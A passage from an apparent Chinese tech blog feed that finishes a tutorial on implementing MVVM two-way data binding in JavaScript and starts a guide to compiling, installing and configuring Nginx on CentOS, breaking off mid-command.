class="comment">// 如 &lt;span v-text="content"&gt;&lt;/span&gt; 中指令为 v-text</span></span><br><span class="line">            <span class="keyword">var</span> attrName = attr.name;<span class="comment">// v-text</span></span><br><span class="line">            <span class="keyword">if</span> (me.isDirective(attrName)) &#123;</span><br><span class="line">                <span class="keyword">var</span> exp = attr.value; <span class="comment">// content</span></span><br><span class="line">                <span class="keyword">var</span> dir = attrName.substring(<span class="number">2</span>);<span class="comment">// text</span></span><br><span class="line">                <span class="keyword">if</span> (me.isEventDirective(dir)) &#123;</span><br><span class="line">                <span class="comment">// 事件指令, 如 v-on:click</span></span><br><span class="line">                    compileUtil.eventHandler(node, me.$vm, exp, dir);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 普通指令</span></span><br><span class="line">                    compileUtil[dir] &amp;&amp; compileUtil[dir](node, me.$vm, exp);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指令处理集合</span></span><br><span class="line"><span class="keyword">var</span> compileUtil = &#123;</span><br><span class="line">    text: <span class="function"><span class="keyword">function</span>(<span class="params">node, vm, exp</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.bind(node, vm, exp, <span class="string">'text'</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// ...省略</span></span><br><span class="line">    bind: <span class="function"><span class="keyword">function</span>(<span class="params">node, vm, exp, dir</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> updaterFn = updater[dir + <span class="string">'Updater'</span>];</span><br><span class="line">        <span class="comment">// 第一次初始化视图</span></span><br><span class="line">        updaterFn &amp;&amp; updaterFn(node, vm[exp]);</span><br><span class="line">        <span class="comment">// 实例化订阅者，此操作会在对应的属性消息订阅器中添加了该订阅者watcher</span></span><br><span class="line">        <span class="keyword">new</span> Watcher(vm, exp, <span class="function"><span class="keyword">function</span>(<span class="params">value, oldValue</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 一旦属性值有变化，会收到通知执行此更新函数，更新视图</span></span><br><span class="line">            updaterFn &amp;&amp; updaterFn(node, value, oldValue);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新函数</span></span><br><span class="line"><span class="keyword">var</span> updater = &#123;</span><br><span class="line">    textUpdater: <span class="function"><span class="keyword">function</span>(<span class="params">node, value</span>) </span>&#123;</span><br><span class="line">        node.textContent = <span class="keyword">typeof</span> value == <span class="string">'undefined'</span> ? <span class="string">''</span> : value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...省略</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>完整代码 <a href="https://github.com/poetries/mvvm/blob/master/compile.js" target="_blank" rel="noopener">https://github.com/poetries/mvvm/blob/master/compile.js</a></p></blockquote><ul><li>这里通过递归遍历保证了每个节点及子节点都会解析编译到</li><li>指令的声明规定是通过特定前缀的节点属性来标记，如<code>&lt;span v-text=&quot;content&quot;</code>中<code>v-text</code>便是指令</li><li>监听数据、绑定更新函数的处理是在<code>compileUtil.bind()</code>这个方法中，通过<code>new Watcher()</code>添加回调来接收数据变化的通知</li><li>至此，一个简单的<code>Compile</code>就完成了。接下来要看看<code>Watcher</code>这个订阅者的具体实现了</li></ul><h3 id="2-3-实现Watcher"><a href="#2-3-实现Watcher" class="headerlink" title="2.3 实现Watcher"></a>2.3 实现Watcher</h3><blockquote><p><code>Watcher</code>订阅者作为<code>Observer</code>和<code>Compile</code>之间通信的桥梁，主要做的事情是</p></blockquote><ul><li>在自身实例化时往属性订阅器<code>dep</code>里面添加自己</li><li>自身必须有一个<code>update()</code>方法</li><li>待属性变动<code>dep.notice()</code>通知时，能调用自身的<code>update()</code>方法，并触发<code>Compile</code>中绑定的回调，则功成身退。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Watcher</span>(<span class="params">vm, exp, cb</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.cb = cb;</span><br><span class="line">    <span class="keyword">this</span>.vm = vm;</span><br><span class="line">    <span class="keyword">this</span>.exp = exp;</span><br><span class="line">    <span class="comment">// 此处为了触发属性的getter，从而在dep添加自己，结合Observer更易理解</span></span><br><span class="line">    <span class="keyword">this</span>.value = <span class="keyword">this</span>.get(); </span><br><span class="line">&#125;</span><br><span class="line">Watcher.prototype = &#123;</span><br><span class="line">    update: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.run();<span class="comment">// 属性值变化收到通知</span></span><br><span class="line">    &#125;,</span><br><span class="line">    run: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> value = <span class="keyword">this</span>.get(); <span class="comment">// 取到最新值</span></span><br><span class="line">        <span class="keyword">var</span> oldVal = <span class="keyword">this</span>.value;</span><br><span class="line">        <span class="keyword">if</span> (value !== oldVal) &#123;</span><br><span class="line">            <span class="keyword">this</span>.value = value;</span><br><span class="line">            <span class="keyword">this</span>.cb.call(<span class="keyword">this</span>.vm, value, oldVal); <span class="comment">// 执行Compile中绑定的回调，更新视图</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        Dep.target = <span class="keyword">this</span>;<span class="comment">// 将当前订阅者指向自己</span></span><br><span class="line">        <span class="keyword">var</span> value = <span class="keyword">this</span>.vm[exp];<span class="comment">// 触发getter，添加自己到属性订阅器中</span></span><br><span class="line">        Dep.target = <span class="literal">null</span>;<span class="comment">// 添加完毕，重置</span></span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 这里再次列出Observer和Dep，方便理解</span></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(data, key, &#123;</span><br><span class="line">get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// 由于需要在闭包内添加watcher，所以可以在Dep定义一个全局target属性，暂存watcher, 添加完移除</span></span><br><span class="line">Dep.target &amp;&amp; dep.addDep(Dep.target);</span><br><span class="line"><span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// ... 省略</span></span><br><span class="line">&#125;);</span><br><span class="line">Dep.prototype = &#123;</span><br><span class="line">    notify: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.subs.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">sub</span>) </span>&#123;</span><br><span class="line">            sub.update(); <span class="comment">// 调用订阅者的update方法，通知变化</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>完整代码 <a href="https://github.com/poetries/mvvm/blob/master/watcher.js" target="_blank" rel="noopener">https://github.com/poetries/mvvm/blob/master/watcher.js</a></p></blockquote><ul><li>实例化<code>Watcher</code>的时候，调用<code>get()</code>方法，通过<code>Dep.target = watcherInstance</code>标记订阅者是当前<code>watcher</code>实例，强行触发属性定义的<code>getter</code>方法，<code>getter</code>方法执行的时候，就会在属性的订阅器<code>dep</code>添加当前<code>watcher</code>实例，从而在属性值有变化的时候，<code>watcherInstance</code>就能收到更新通知。</li><li>基本上<code>vue</code>中数据绑定相关比较核心的几个模块也是这几个，猛戳<a href="https://github.com/vuejs/vue" target="_blank" rel="noopener">这里</a> , 在<code>src</code> 目录可找到<code>vue</code>源码。</li></ul><blockquote><p>最后来讲讲<code>MVVM</code>入口文件的相关逻辑和实现吧，相对就比较简单了</p></blockquote><h2 id="三、实现MVVM"><a href="#三、实现MVVM" class="headerlink" title="三、实现MVVM"></a>三、实现MVVM</h2><blockquote><p><code>MVVM</code>作为数据绑定的入口，整合<code>Observer</code>、<code>Compile</code>和<code>Watcher</code>三者，通过<code>Observer</code>来监听自己的<code>model</code>数据变化，通过<code>Compile</code>来解析编译模板指令，最终利用<code>Watcher</code>搭起<code>Observer</code>和<code>Compile</code>之间的通信桥梁，达到数据变化 -&gt; 视图更新；视图交互变化(<code>input</code>) -&gt; 数据<code>model</code>变更的双向绑定效果。</p></blockquote><ul><li>一个简单的<code>MVVM</code>构造器是这样子：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MVVM</span>(<span class="params">options</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.$options = options;</span><br><span class="line">    <span class="keyword">var</span> data = <span class="keyword">this</span>._data = <span class="keyword">this</span>.$options.data;</span><br><span class="line">    observe(data, <span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.$compile = <span class="keyword">new</span> Compile(options.el || <span class="built_in">document</span>.body, <span class="keyword">this</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>但是这里有个问题，从代码中可看出监听的数据对象是<code>options.data</code>，每次需要更新视图，则必须通过<code>var vm = new MVVM({data:{name: &#39;kindeng&#39;}}); vm._data.name = &#39;dmq&#39;;</code>这样的方式来改变数据。</li><li>显然不符合我们一开始的期望，我们所期望的调用方式应该是这样的：<br><code>var vm = new MVVM({data: {name: &#39;kindeng&#39;}}); vm.name = &#39;dmq&#39;;</code></li><li>所以这里需要给<code>MVVM</code>实例添加一个属性代理的方法，使访问<code>vm</code>的属性代理为访问<code>vm._data</code>的属性，改造后的代码如下：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MVVM</span>(<span class="params">options</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.$options = options;</span><br><span class="line">    <span class="keyword">var</span> data = <span class="keyword">this</span>._data = <span class="keyword">this</span>.$options.data, me = <span class="keyword">this</span>;</span><br><span class="line">    <span class="comment">// 属性代理，实现 vm.xxx -&gt; vm._data.xxx</span></span><br><span class="line">    <span class="built_in">Object</span>.keys(data).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">        me._proxy(key);</span><br><span class="line">    &#125;);</span><br><span class="line">    observe(data, <span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.$compile = <span class="keyword">new</span> Compile(options.el || <span class="built_in">document</span>.body, <span class="keyword">this</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MVVM.prototype = &#123;</span><br><span class="line">_proxy: <span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> me = <span class="keyword">this</span>;</span><br><span class="line">        <span class="built_in">Object</span>.defineProperty(me, key, &#123;</span><br><span class="line">            configurable: <span class="literal">false</span>,</span><br><span class="line">            enumerable: <span class="literal">true</span>,</span><br><span class="line">            get: <span class="function"><span class="keyword">function</span> <span class="title">proxyGetter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> me._data[key];</span><br><span class="line">            &#125;,</span><br><span class="line">            set: <span class="function"><span class="keyword">function</span> <span class="title">proxySetter</span>(<span class="params">newVal</span>) </span>&#123;</span><br><span class="line">                me._data[key] = newVal;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整代码 <a href="https://github.com/poetries/mvvm/blob/master/mvvm.js" target="_blank" rel="noopener">https://github.com/poetries/mvvm/blob/master/mvvm.js</a></p><ul><li>这里主要还是利用了<code>Object.defineProperty()</code>这个方法来劫持了<code>vm</code>实例对象的属性的读写权，使读写<code>vm</code>实例的属性转成读写了<code>vm._data</code>的属性值，达到鱼目混珠的效果</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;完成的效果&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;sp
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="MVVM" scheme="http://blog.poetries.top/tags/MVVM/"/>
    
  </entry>
  
  <entry>
    <title>Nginx学习篇</title>
    <link href="http://blog.poetries.top/2018/02/25/nginx-study/"/>
    <id>http://blog.poetries.top/2018/02/25/nginx-study/</id>
    <published>2018-02-25T07:12:08.000Z</published>
    <updated>2018-08-23T01:41:37.487Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><code>Nginx</code> 是一款面向性能设计的 <code>HTTP</code> 服务器，能反向代理 <code>HTTP</code>，<code>HTTPS</code> 和邮件相关(<code>SMTP</code>，<code>POP3</code>，<code>IMAP</code>)的协议链接。并且提供了负载均衡以及 <code>HTTP</code> 缓存。它的设计充分使用异步事件模型，削减上下文调度的开销，提高服务器并发能力。采用了模块化设计，提供了丰富模块的第三方模块。</p></blockquote><ul><li>所以关于 `Nginx，有这些标签：「异步」「事件」「模块化」「高性能」「高并发」「反向代理」「负载均衡」</li></ul><h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><h3 id="1-1-安装依赖"><a href="#1-1-安装依赖" class="headerlink" title="1.1 安装依赖"></a>1.1 安装依赖</h3><blockquote><p><code>prce</code>(重定向支持)和<code>openssl</code>(<code>https</code>支持，如果不需要<code>https</code>可以不安装)</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install -y pcre-devel </span><br><span class="line">yum -y install gcc make gcc-c++ wget</span><br><span class="line">yum -y install openssl openssl-devel</span><br></pre></td></tr></table></figure><p><code>CentOS 6.5</code> 我安装的时候是选择的“基本服务器”，默认这两个包都没安装全，所以这两个都运行安装即可</p><h3 id="1-2-下载"><a href="#1-2-下载" class="headerlink" title="1.2 下载"></a>1.2 下载</h3><p><a href="http://nginx.org/download/" target="_blank" rel="noopener">nginx的所有版本在这里</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget http://nginx.org/download/nginx-1.13.3.tar.gz</span><br><span class="line">wget http://nginx.org/download/nginx-1.13.7.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果没有安装wget</span></span><br><span class="line"><span class="comment"># 下载已编译版本</span></span><br><span class="line">$ yum install wget</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压压缩包</span></span><br><span class="line">tar zxf nginx-1.13.3.tar.gz</span><br></pre></td></tr></table></figure><h3 id="1-3-编译安装"><a href="#1-3-编译安装" class="headerlink" title="1.3 编译安装"></a>1.3 编译安装</h3><p>然后进入目录编译安装，<a href="#configure参数说明">configure参数说明</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> nginx-1.11.5</span><br><span class="line">./configure</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">Configuration summary</span><br><span class="line">  + using system PCRE library</span><br><span class="line">  + OpenSSL library is not used</span><br><span class="line">  + using system zlib library</span><br><span class="line"></span><br><span class="line">  nginx path prefix: <span class="string">"/usr/local/nginx"</span></span><br><span class="line">  nginx binary file: <span class="string">"/usr/local/nginx/sbin/nginx"</span></span><br><span class="line">  nginx modules path: <span class="string">"/usr/local/nginx/modules"</span></span><br><span class="line">  nginx configuration prefix: <span class="string">"/usr/local/nginx/conf"</span></span><br><span class="line">  nginx configuration file: <span class="string">"/usr/local/nginx/conf/nginx.conf"</span></span><br><span class="line">  nginx pid file: <span class="string">"/usr/local/nginx/logs/nginx.pid"</span></span><br><span class="line">  nginx error <span class="built_in">log</span> file: <span class="string">"/usr/local/nginx/logs/error.log"</span></span><br><span class="line">  nginx http access <span class="built_in">log</span> file: <span class="string">"/usr/local/nginx/logs/access.log"</span></span><br><span class="line">  nginx http client request body temporary files: <span class="string">"client_body_temp"</span></span><br><span class="line">  nginx http proxy temporary files: <span class="string">"proxy_temp"</span></span><br><span class="line">  nginx http fastcgi temporary files: <span class="string">"fastcgi_temp"</span></span><br><span class="line">  nginx http uwsgi temporary files: <span class="string">"uwsgi_temp"</span></span><br><span class="line">  nginx http scgi temporary files: <span class="string">"scgi_temp"</span></span><br></pre></td></tr></table></figure><blockquote><p>安装报错误的话比如：<code>“C compiler cc is not found”</code>，这个就是缺少编译环境，安装一下就可以了 <code>yum -y install gcc make gcc-c++ openssl-devel</code></p></blockquote><p>如果没有<code>error</code>信息，就可以执行下边的安装了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h3 id="1-4-nginx测试"><a href="#1-4-nginx测试" class="headerlink" title="1.4 nginx测试"></a>1.4 nginx测试</h3><ul><li>运行下面命令会出现两个结果，一般情况<code>nginx</code>会安装在<code>/usr/local/nginx</code>目录中</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/nginx/sbin/</span><br><span class="line">./nginx -t</span><br><span class="line"></span><br><span class="line"><span class="comment"># nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok</span></span><br><span class="line"><span class="comment"># nginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful</span></span><br></pre></td></tr></table></figure><h3 id="1-5-设置全局nginx命令"><a href="#1-5-设置全局nginx命令" class="headerlink" title="1.5 设置全局nginx命令"></a>1.5 设置全局nginx命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi ~/.bash_profile</span><br></pre></td></tr></table></figure><p>将下面内容添加到 <code>~/.bash_profile</code> 文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PATH=<span class="variable">$PATH</span>:<span class="variable">$HOME</span>/bin:/usr/<span class="built_in">local</span>/nginx/sbin/</span><br><span class="line"><span class="built_in">export</span> PATH</span><br></pre></td></tr></table></figure><p>运行命令 <strong><code>source ~/.bash_profile</code></strong> 让配置立即生效。你就可以全局运行 <code>nginx</code> 命令了。</p><h2 id="二、开机自启动"><a href="#二、开机自启动" class="headerlink" title="二、开机自启动"></a>二、开机自启动</h2><p><strong>开机自启动方法一</strong></p><ul><li>编辑 <strong><code>vi /lib/systemd/system/nginx.service</code></strong> 文件，没有创建一个 <strong><code>touch nginx.service</code></strong> - 然后将如下内容根据具体情况进行修改后，添加到<code>nginx.service</code>文件中：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=nginx</span><br><span class="line">After=network.target remote-fs.target nss-lookup.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line"></span><br><span class="line">Type=forking</span><br><span class="line">PIDFile=/var/run/nginx.pid</span><br><span class="line">ExecStartPre=/usr/<span class="built_in">local</span>/nginx/sbin/nginx -t -c /usr/<span class="built_in">local</span>/nginx/conf/nginx.conf</span><br><span class="line">ExecStart=/usr/<span class="built_in">local</span>/nginx/sbin/nginx -c /usr/<span class="built_in">local</span>/nginx/conf/nginx.conf</span><br><span class="line">ExecReload=/bin/<span class="built_in">kill</span> -s HUP <span class="variable">$MAINPID</span></span><br><span class="line">ExecStop=/bin/<span class="built_in">kill</span> -s QUIT <span class="variable">$MAINPID</span></span><br><span class="line">PrivateTmp=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[Unit]:服务的说明  </span><br><span class="line">Description:描述服务  </span><br><span class="line">After:描述服务类别  </span><br><span class="line">[Service]服务运行参数的设置  </span><br><span class="line">Type=forking是后台运行的形式  </span><br><span class="line">ExecStart为服务的具体运行命令  </span><br><span class="line">ExecReload为重启命令  </span><br><span class="line">ExecStop为停止命令  </span><br><span class="line">PrivateTmp=True表示给服务分配独立的临时空间  </span><br><span class="line">注意：[Service]的启动、重启、停止命令全部要求使用绝对路径  </span><br><span class="line">[Install]运行级别下服务安装的相关设置，可设置为多用户，即系统运行级别为3</span><br></pre></td></tr></table></figure><p>保存退出。</p><p>设置开机启动，使配置生效：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> nginx.service</span><br><span class="line"><span class="comment"># 输出下面内容表示成功了</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/nginx.service to /usr/lib/systemd/system/nginx.service.</span><br></pre></td></tr></table></figure><p><strong>开机自启动方法二</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/rc.local</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 rc.local 文件中，添加下面这条命令</span></span><br><span class="line">/usr/<span class="built_in">local</span>/nginx/sbin/nginx start</span><br></pre></td></tr></table></figure><ul><li>如果开机后发现自启动脚本没有执行，你要去确认一下<code>rc.local</code>这个文件的访问权限是否是可执行的，因为<code>rc.local</code>默认是不可执行的。修改<code>rc.local</code>访问权限，增加可执行权限：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure><h2 id="三、运维"><a href="#三、运维" class="headerlink" title="三、运维"></a>三、运维</h2><h3 id="3-1-服务管理"><a href="#3-1-服务管理" class="headerlink" title="3.1 服务管理"></a>3.1 服务管理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动</span></span><br><span class="line">/usr/<span class="built_in">local</span>/nginx/sbin/nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">/usr/<span class="built_in">local</span>/nginx/sbin/nginx -s reload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭进程</span></span><br><span class="line">/usr/<span class="built_in">local</span>/nginx/sbin/nginx -s stop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 平滑关闭nginx</span></span><br><span class="line">/usr/<span class="built_in">local</span>/nginx/sbin/nginx -s quit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看nginx的安装状态，</span></span><br><span class="line">/usr/<span class="built_in">local</span>/nginx/sbin/nginx -V</span><br></pre></td></tr></table></figure><p><strong>关闭防火墙，或者添加防火墙规则就可以测试了</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service iptables stop</span><br></pre></td></tr></table></figure><p>或者编辑配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/sysconfig/iptables</span><br></pre></td></tr></table></figure><p>添加这样一条开放80端口的规则后保存：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT</span><br></pre></td></tr></table></figure><p>重启服务即可:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service iptables restart</span><br><span class="line"><span class="comment"># 命令进行查看目前nat</span></span><br><span class="line">iptables -t nat -L</span><br></pre></td></tr></table></figure><h3 id="3-2-重启服务防火墙报错解决"><a href="#3-2-重启服务防火墙报错解决" class="headerlink" title="3.2 重启服务防火墙报错解决"></a>3.2 重启服务防火墙报错解决</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service iptables restart</span><br><span class="line"><span class="comment"># Redirecting to /bin/systemctl restart  iptables.service</span></span><br><span class="line"><span class="comment"># Failed to restart iptables.service: Unit iptables.service failed to load: No such file or directory.</span></span><br></pre></td></tr></table></figure><ul><li>在<code>CentOS 7</code>或<code>RHEL 7</code>或<code>Fedora</code>中防火墙由 <strong><code>firewalld</code></strong> 来管理，当然你可以还原传统的管理方式。或则使用新的命令进行管理。<br>假如采用传统请执行一下命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 传统命令</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl mask firewalld</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装命令</span></span><br><span class="line">yum install iptables-services</span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> iptables </span><br><span class="line">service iptables restart</span><br></pre></td></tr></table></figure><h2 id="四、nginx卸载"><a href="#四、nginx卸载" class="headerlink" title="四、nginx卸载"></a>四、nginx卸载</h2><ul><li>如果通过<code>yum</code>安装，使用下面命令安装。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum remove 